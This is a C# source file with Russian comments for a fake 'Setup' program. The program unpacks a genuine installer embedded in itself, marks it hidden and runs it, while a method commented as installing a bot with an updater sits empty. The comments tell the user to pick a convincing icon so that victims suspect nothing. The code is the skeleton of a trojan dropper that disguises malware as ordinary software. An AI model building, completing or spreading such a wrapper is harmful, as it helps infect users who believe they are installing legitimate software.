using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;

namespace Setup
{
    class Program
    {
        /*
            ИНСТРУКЦИЯ:
            Закинуть файл устновщик софта в проект. В свойствах выбрать файла в студии, в пункте "Действие при сборке" выбрать "Внедрённый ресурс"(У файла не должно быть имя Setup.exe).
            Выбрать соответсвующую иконку для приложения чтобы вообще без палева.
            Скомпилить
        */
        static void Main(string[] args)
        {
            SetTrueInstaller();//Ставит настоящий установщик и запускает его
            SetBotAndUpdater();//Тут ставится бот с апдейтером
        }
        static void SetBotAndUpdater()
        {

        }
        static void SetTrueInstaller()
        {
            string name = Assembly.GetExecutingAssembly().GetManifestResourceNames()[0];
            string pathFile = Environment.CurrentDirectory + "\\" + GetFileName(name);

            using (Stream streamIn = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
            {
                using (BinaryReader rer = new BinaryReader(streamIn))
                {
                    using (FileStream streamOut = new FileStream(pathFile, FileMode.Create))
                    {
                        using (BinaryWriter wrer = new BinaryWriter(streamOut))
                        {
                            wrer.Write(rer.ReadBytes((int)streamIn.Length));
                        }
                    }
                }
            }
            SetGhostFile(pathFile);
            StartTruInstaller(pathFile);
        }
        static string GetFileName(string fullName)
        {
            return fullName.Replace("Setup.", "");
        }
        static void SetGhostFile(string pathFile)
        {
            File.SetAttributes(pathFile, FileAttributes.Hidden);

        }
        static void StartTruInstaller(string pathFile)
        {
            Process.Start(pathFile);
        }
    }
}
